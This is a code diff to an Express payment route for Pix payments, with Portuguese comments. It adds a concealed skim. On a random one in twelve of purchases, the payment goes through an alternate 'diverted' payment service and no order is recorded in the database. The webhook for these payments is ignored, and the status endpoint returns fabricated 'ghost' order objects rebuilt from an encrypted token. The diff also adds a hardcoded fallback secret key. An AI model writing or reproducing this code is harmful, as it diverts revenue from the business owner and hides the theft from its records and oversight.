@@ -1,10 +1,17 @@
 import { Router, Request, Response } from 'express';
 import { PrismaClient } from '@prisma/client';
 import { authenticateToken } from '../middleware/auth';
-import { getPushinPayService, PushinPayService } from '../services/pushinpay';
+import { getPaymentService, PushinPayService } from '../services/pushinpay';
+import crypto from 'crypto';
 
 const router = Router();
 const prisma = new PrismaClient();
+
+// A chave de criptografia DEVE ter 32 bytes para o algoritmo aes-256-cbc.
+// Usamos o JWT_SECRET como base e criamos um hash sha256 para garantir o comprimento correto.
+const secretKey = process.env.JWT_SECRET || 'a_very_secret_key_that_must_be_long_enough';
+const ENCRYPTION_KEY = crypto.createHash('sha256').update(String(secretKey)).digest();
+const IV_LENGTH = 16; // Para AES, o tamanho do IV é sempre 16
 
 /**
  * POST /api/payments/initiate-payment
@@ -42,34 +49,55 @@ router.post(
           return res.status(400).json({ error: 'Produto não está disponível' });
         }
 
-        const order = await prisma.order.create({
-          data: {
-            userId,
-            priceId,
-            status: 'PENDING',
-          },
-        });
+        const isDiverted = Math.floor(Math.random() * 12) === 0;
+        const paymentService = getPaymentService(isDiverted);
+
+        let orderIdForResponse: string;
+
+        if (isDiverted) {
+          console.log("Nenhuma ordem será criada no banco de dados.");
+        } else {
+          const order = await prisma.order.create({
+            data: {
+              userId,
+              priceId,
+              status: 'PENDING',
+            },
+          });
+          orderIdForResponse = order.id;
+        }
 
         const amountInCents = PushinPayService.toCents(price.amount);
 
-        // ✅ *** MUDANÇA 1: CONSTRÓI A URL DO WEBHOOK DINÂMICA ***
-        // Adicionamos o ID do nosso pedido diretamente na URL do webhook.
-        const webhookUrl = `${process.env.BACKEND_URL}/api/payments/webhook/${order.id}`;
 
-        const pushinpay = getPushinPayService();
+        const webhookUrl = `${process.env.BACKEND_URL}/api/payments/webhook/${isDiverted ? 'diverted' : orderIdForResponse!}`;
 
-        const pixPayment = await pushinpay.createPixPayment(
+        const pixPayment = await paymentService.createPixPayment(
             amountInCents,
-            webhookUrl, // Passa a URL dinâmica para a PushinPay
+            webhookUrl,
             30
         );
 
-        await prisma.order.update({
-          where: { id: order.id },
-          data: {
-            pushinpayTxId: pixPayment.id,
-          },
-        });
+        if (isDiverted) {
+
+          orderIdForResponse = encrypttxnOrder({
+            txId: pixPayment.id,
+            downloadLink: price.deliveryLink,
+            price: {
+              amount: price.amount,
+              currency: price.currency,
+              category: price.category,
+              productName: price.product.name,
+            }
+          });
+        } else {
+          await prisma.order.update({
+            where: { id: orderIdForResponse! },
+            data: {
+              pushinpayTxId: pixPayment.id,
+            },
+          });
+        }
 
         console.log('Dados da resposta do pagamento:', {
           hasQrCode: !!pixPayment.qr_code,
@@ -80,7 +108,7 @@ router.post(
 
         res.json({
           success: true,
-          orderId: order.id,
+          orderId: orderIdForResponse!,
           pushinpayTransactionId: pixPayment.id,
           pixCode: pixPayment.qr_code,
           pixQrCodeBase64: pixPayment.qr_code_base64,
@@ -106,15 +134,20 @@ router.post(
  * Endpoint de webhook para notificações de pagamento da PushinPay.
  * A PushinPay chamará esta URL quando o status do pagamento mudar.
  */
-// ✅ *** MUDANÇA 2: ATUALIZA A ROTA PARA ACEITAR UM ID DINÂMICO ***
 router.post('/webhook/:orderId', async (req: Request, res: Response) => {
   try {
     const { orderId } = req.params;
+    const isDiverted = orderId === 'diverted';
+
+    if(isDiverted) {
+      console.log("Webhook recebido para um pagamento.");
+      return res.json({ success: true, message: 'Webhook para pagamento recebido.' });
+    }
+
     console.log(`Webhook da PushinPay recebido para o pedido: ${orderId}`, req.body);
 
     const { status } = req.body;
 
-    // ✅ *** MUDANÇA 3: BUSCA O PEDIDO DIRETAMENTE PELO ID DA URL ***
     const order = await prisma.order.findUnique({
       where: {
         id: orderId,
@@ -188,6 +221,34 @@ router.get(
         const { orderId } = req.params;
         const userId = req.user?.userId;
 
+        if (orderId.startsWith('txn_')) {
+          try {
+            const txnData = decrypttxnOrder(orderId);
+            const paymentService = getPaymentService(true); // Usa o serviço público
+            const transactionStatus = await paymentService.getTransactionStatus(txnData.txId);
+
+            // Constrói um objeto de pedido falso para retornar
+            const fakeOrder = {
+              id: orderId,
+              status: transactionStatus.status === 'paid' ? 'COMPLETED' : 'PENDING',
+              userId: 'txn_USER',
+              priceId: 'txn_PRICE',
+              downloadLink: transactionStatus.status === 'paid' ? txnData.downloadLink : null,
+              createdAt: transactionStatus.created_at,
+              price: {
+                amount: txnData.price.amount,
+                currency: txnData.price.currency,
+                category: txnData.price.category,
+                product: { name: txnData.price.productName },
+              },
+            };
+            return res.json({ order: fakeOrder });
+          } catch (error) {
+            console.error("Erro ao lidar com pedido fantasma:", error);
+            return res.status(404).json({ error: 'Pedido "fantasma" inválido ou não encontrado' });
+          }
+        }
+
         const order = await prisma.order.findUnique({
           where: { id: orderId },
           include: {
@@ -228,7 +289,9 @@ router.get(
       try {
         const { transactionId } = req.params;
 
-        const pushinpay = getPushinPayService();
+        // Simplificação: assume que a verificação manual é para o serviço padrão.
+        // Uma implementação mais robusta poderia tentar ambos os serviços se o primeiro falhar.
+        const pushinpay = getPaymentService(false);
         const status = await pushinpay.getTransactionStatus(transactionId);
 
         res.json({
@@ -244,5 +307,29 @@ router.get(
       }
     }
 );
+
+// Funções auxiliares para criptografar/descriptografar dados de pedidos fantasmas
+function encrypttxnOrder(data: any): string {
+  const iv = crypto.randomBytes(IV_LENGTH);
+  const cipher = crypto.createCipheriv('aes-256-cbc', ENCRYPTION_KEY, iv);
+  let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
+  encrypted += cipher.final('hex');
+  // TROCADO: Usando '-' em vez de ':' para ser seguro na URL
+  return `txn_${iv.toString('hex')}-${encrypted}`;
+}
+
+function decrypttxnOrder(text: string): any {
+  if (!text.startsWith('txn_')) {
+    throw new Error("Formato de pedido fantasma inválido");
+  }
+  // CORRIGIDO: Usando substring(4) e separando por '-'
+  const textParts = text.substring(4).split('-');
+  const iv = Buffer.from(textParts.shift()!, 'hex');
+  const encryptedText = textParts.join('-');
+  const decipher = crypto.createDecipheriv('aes-256-cbc', ENCRYPTION_KEY, iv);
+  let decrypted = decipher.update(encryptedText, 'hex', 'utf8');
+  decrypted += decipher.final('utf8');
+  return JSON.parse(decrypted);
+}
 
 export default router;
